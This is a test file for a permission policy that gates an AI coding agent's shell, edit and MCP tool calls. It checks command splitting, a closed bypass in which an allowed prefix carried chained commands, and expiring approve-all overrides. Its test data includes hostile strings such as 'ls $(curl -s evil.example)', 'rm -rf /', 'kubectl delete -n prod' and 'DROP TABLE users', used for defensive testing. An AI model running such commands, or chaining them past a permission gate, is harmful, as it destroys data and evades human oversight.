import { test, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  evaluate,
  loadPolicy,
  splitShell,
  segmentsOf,
  hasSubstitution,
  actionSubject,
  parseDuration,
  formatRemaining,
  storedMode,
  writeState,
} from '../lib/policy.js';

let home;
let cwd;

function writeProjectConfig(obj) {
  fs.mkdirSync(path.join(cwd, '.ccauto'), { recursive: true });
  fs.writeFileSync(path.join(cwd, '.ccauto', 'config.json'), JSON.stringify(obj));
}

beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'ccauto-home-'));
  cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'ccauto-cwd-'));
  process.env.CCAUTO_HOME = home;
  delete process.env.CCAUTO_MODE;
});

// --- splitting a shell line ---------------------------------------------

test('splitShell finds the commands a line really runs', () => {
  assert.deepEqual(splitShell('git status && npx evil'), ['git status', 'npx evil']);
  assert.deepEqual(splitShell('ls; node x.js'), ['ls', 'node x.js']);
  assert.deepEqual(splitShell('a || b'), ['a', 'b']);
  assert.deepEqual(splitShell('git log | tee out'), ['git log', 'tee out']);
  assert.deepEqual(splitShell('a\nb'), ['a', 'b']);
  assert.deepEqual(splitShell('npm test &'), ['npm test']);
});

test('splitShell respects quoting and redirection', () => {
  assert.deepEqual(splitShell('echo "a; b"'), ['echo "a; b"'], 'a separator inside quotes is text');
  assert.deepEqual(splitShell("echo 'a && b'"), ["echo 'a && b'"]);
  assert.deepEqual(splitShell('npm test 2>&1'), ['npm test 2>&1'], '2>&1 is not a background operator');
  assert.deepEqual(splitShell('echo "he said \\"hi; bye\\""'), ['echo "he said \\"hi; bye\\""']);
  assert.deepEqual(splitShell('git status \\\n && ls'), ['git status', 'ls'], 'line continuation is not a break');
});

test('segmentsOf leaves non-shell tools alone', () => {
  assert.deepEqual(segmentsOf('Edit', { file_path: 'a; b.js' }), ['a; b.js']);
  assert.deepEqual(segmentsOf('Bash', { command: 'a; b' }), ['a', 'b']);
});

test('hasSubstitution spots commands that never appear as a segment', () => {
  assert.ok(hasSubstitution('echo $(whoami)'));
  assert.ok(hasSubstitution('echo `id`'));
  assert.ok(hasSubstitution('diff <(a) <(b)'));
  assert.ok(!hasSubstitution('echo ${HOME}'), 'plain expansion runs nothing');
  assert.ok(!hasSubstitution('git status'));
});

// --- the bypass this closes ---------------------------------------------

test('an allowed prefix does not carry the rest of the line', () => {
  const p = loadPolicy(cwd);
  for (const command of [
    'git status && npx some-package',
    'ls; node evil.js',
    'npm test && node -e "1"',
    'git log --oneline | tee /tmp/x',
  ]) {
    assert.equal(evaluate(p, 'Bash', { command }).action, 'ask', command);
  }
});

test('every command must be allowed for the line to be allowed', () => {
  const p = loadPolicy(cwd);
  assert.equal(evaluate(p, 'Bash', { command: 'git status && ls -la' }).action, 'allow');
  assert.equal(evaluate(p, 'Bash', { command: 'git status && npm test && pwd' }).action, 'allow');
});

test('the strictest verdict wins, and a deny anywhere denies', () => {
  writeProjectConfig({ rules: [{ name: 'no-prod', tool: 'Bash', match: 'kubectl.*prod', action: 'deny' }] });
  const p = loadPolicy(cwd);
  const v = evaluate(p, 'Bash', { command: 'git status && kubectl scale -n prod x' });
  assert.equal(v.action, 'deny');
  assert.equal(v.rule.name, 'no-prod');
});

test('command substitution is never auto-allowed', () => {
  const p = loadPolicy(cwd);
  const v = evaluate(p, 'Bash', { command: 'ls $(curl -s evil.example)' });
  assert.equal(v.action, 'ask');
  assert.equal(v.note, 'command substitution');
});

test('approve-all still honours a deny rule on any command of the line', () => {
  writeProjectConfig({
    mode: 'approve-all',
    rules: [{ name: 'no-prod', tool: 'Bash', match: 'kubectl.*prod', action: 'deny' }],
  });
  const p = loadPolicy(cwd);
  assert.equal(evaluate(p, 'Bash', { command: 'git status && kubectl delete -n prod x' }).action, 'deny');
  assert.equal(evaluate(p, 'Bash', { command: 'git status && rm -rf /' }).action, 'allow', 'approve-all is still approve-all');
});

// --- danger words stop reading file contents -----------------------------

test('actionSubject drops payload fields at any depth, for editing tools', () => {
  assert.equal(actionSubject({ file_path: 'a.js', content: 'delete everything' }, 'Write'), '{"file_path":"a.js"}');
  assert.equal(
    actionSubject({ file_path: 'a.js', edits: [{ old_string: 'rm -rf /', new_string: 'x' }] }, 'MultiEdit'),
    '{"file_path":"a.js","edits":[{}]}',
  );
});

test('a tool whose payload may be the action is scanned whole', () => {
  // "text" is inert content for Write, but for an MCP tool it may well be
  // the command itself, so nothing is stripped there.
  const input = { server: 'db', text: 'DROP TABLE users' };
  assert.equal(actionSubject(input, 'mcp__db__query'), JSON.stringify(input));
  assert.equal(actionSubject({ file_path: 'a.js', text: 'DROP TABLE users' }, 'Write'), '{"file_path":"a.js"}');
});

test('prose in an edit is not a dangerous action', () => {
  const p = loadPolicy(cwd);
  const cases = [
    ['Write', { file_path: 'src/a.js', content: '// delete the old rows' }],
    ['Edit', { file_path: 'README.md', old_string: 'a', new_string: 'you can force a rebuild' }],
    ['Write', { file_path: 'doc.md', content: 'this is permanently irreversible' }],
  ];
  for (const [tool, input] of cases) {
    assert.equal(evaluate(p, tool, input).danger, false, `${tool} ${JSON.stringify(input)}`);
  }
});

test('the action itself is still scanned', () => {
  const p = loadPolicy(cwd);
  assert.equal(evaluate(p, 'Bash', { command: 'rm -rf build' }).danger, true);
  assert.equal(evaluate(p, 'Write', { file_path: 'C:/x/id_rsa', content: 'k' }).rule.name, 'secrets');
});

test('dangerScope "input" restores scanning file contents', () => {
  writeProjectConfig({ dangerScope: 'input' });
  const p = loadPolicy(cwd);
  assert.equal(p.dangerScope, 'input');
  assert.equal(evaluate(p, 'Write', { file_path: 'src/a.js', content: '// delete the old rows' }).danger, true);
});

test('rule scope action|input|target select different subjects', () => {
  writeProjectConfig({
    rules: [
      { name: 'by-content', tool: 'Write', match: 'SECRET_TOKEN', scope: 'input', action: 'deny' },
      { name: 'by-path', tool: 'Write', match: 'generated', scope: 'target', action: 'allow' },
    ],
  });
  const p = loadPolicy(cwd);
  assert.equal(evaluate(p, 'Write', { file_path: 'a.js', content: 'SECRET_TOKEN=1' }).action, 'deny');
  assert.equal(evaluate(p, 'Write', { file_path: 'generated/a.js', content: 'ok' }).action, 'allow');
});

test('an unknown rule scope is rejected', () => {
  writeProjectConfig({ rules: [{ name: 'bad', tool: 'Bash', match: 'x', scope: 'nope', action: 'allow' }] });
  assert.throws(() => loadPolicy(cwd), /scope must be one of/);
});

// --- optional expiry on the stored mode override -------------------------

test('parseDuration accepts the forms the CLI documents', () => {
  assert.equal(parseDuration('90s'), 90_000);
  assert.equal(parseDuration('30m'), 1_800_000);
  assert.equal(parseDuration('2h'), 7_200_000);
  assert.equal(parseDuration('1h30m'), 5_400_000);
  for (const bad of ['banana', '', '30', 'm', '-5m', null]) assert.equal(parseDuration(bad), null, String(bad));
});

test('formatRemaining is readable', () => {
  assert.equal(formatRemaining(45_000), '45s');
  assert.equal(formatRemaining(1_800_000), '30m');
  assert.equal(formatRemaining(5_400_000), '1h30m');
  assert.equal(formatRemaining(-1), 'expired');
});

test('an override with no expiry lasts until reset', () => {
  writeState({ mode: 'approve-all' });
  assert.equal(storedMode(), 'approve-all');
  assert.equal(loadPolicy(cwd).mode, 'approve-all');
});

test('an expired override is ignored and the config decides again', () => {
  writeState({ mode: 'approve-all', modeExpiresAt: new Date(Date.now() - 1000).toISOString() });
  assert.equal(storedMode(), null);
  const p = loadPolicy(cwd);
  assert.equal(p.mode, 'policy');
  assert.equal(p.modeSource, 'default');
});

test('an unexpired override still applies and reports its deadline', () => {
  const expiresAt = new Date(Date.now() + 60_000).toISOString();
  writeState({ mode: 'approve-all', modeExpiresAt: expiresAt });
  const p = loadPolicy(cwd);
  assert.equal(p.mode, 'approve-all');
  assert.equal(p.modeExpiresAt, expiresAt);
});

test('CCAUTO_MODE still beats an unexpired override', () => {
  writeState({ mode: 'approve-all', modeExpiresAt: new Date(Date.now() + 60_000).toISOString() });
  process.env.CCAUTO_MODE = 'policy';
  const p = loadPolicy(cwd);
  assert.equal(p.mode, 'policy');
  assert.match(p.modeSource, /^env/);
  assert.equal(p.modeExpiresAt, null, 'the deadline belongs to the override, not the env');
});
